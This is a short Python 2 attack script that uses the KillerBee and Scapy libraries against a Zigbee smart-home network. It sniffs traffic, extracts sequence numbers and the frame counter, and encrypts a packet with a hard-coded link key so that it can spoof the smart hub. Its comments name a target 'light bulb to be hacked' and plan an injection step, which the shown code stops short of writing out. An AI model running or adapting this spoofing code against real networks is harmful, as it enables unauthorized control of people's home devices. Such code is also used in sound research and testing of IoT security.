__author__ = 'Soteria'

# 1. Sniff link-status and route request messages
# 2. Extract relevant sequence numbers:
    ## IEEE sequence number
    ## zigbee NWK sequence number
    ## security header - Frame Counter
# 3. Create new packet:
# 4. Change sequence numbers in the new packet
# 5. Create new packet data
# 6. Encrypt the data with the keyc1
# 7. Inject!

import logging
log_killerbee = logging.getLogger('scapy.killerbee')

try:
	from scapy.all import *
except ImportError:
	print 'This Requires Scapy To Be Installed.'
	from sys import exit
	exit(-1)

from killerbee import *
from killerbee.scapy_extensions import *

del hexdump
from scapy.utils import hexdump				# Force using Scapy's hexdump()
import os

DEFAULT_KB_CHANNEL = 11
DEFAULT_KB_DEVICE = '10.10.10.2'
TARGET_DEVICE_ID = '0x055f' # light bulb to be hacked
SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'
#LINK_KEY = 'df42b5956a2bbd46188d590adb04b609'


#Sniff packets to a list and extract data:
packetsList = kbtshark(channel = DEFAULT_KB_CHANNEL,count = 1,iface = DEFAULT_KB_DEVICE, store = 1)
lastPacket = packetsList[0]
ieee_seq_num = lastPacket.fields['seqnum']
print 'IEEE 802.15.4 sequence number = ' + str(ieee_seq_num)

ieee_data_layer = lastPacket.payload
ieee_panID = ieee_data_layer.fields['dest_panid']

print 'IEEE 802.15.4 PAN ID = ' + hex(ieee_panID)

zigbeeNWK_layer = lastPacket.getlayer(ZigbeeNWK)
zigbeeNWK_seq_num = zigbeeNWK_layer.fields['seqnum']
print 'Zigbee NWK sequence number = ' + str(zigbeeNWK_seq_num)


zigbee_security_layer = lastPacket.getlayer(ZigbeeSecurityHeader)
zigbee_frame_counter = zigbee_security_layer.fields['fc']
print 'Zigbee frame counter = ' + str(zigbee_frame_counter)


#Encrypt packet
hexdump(lastPacket.data)
encrypeted_packet = kbencrypt(lastPacket, lastPacket.data, key = LINK_KEY, verbose = 3)
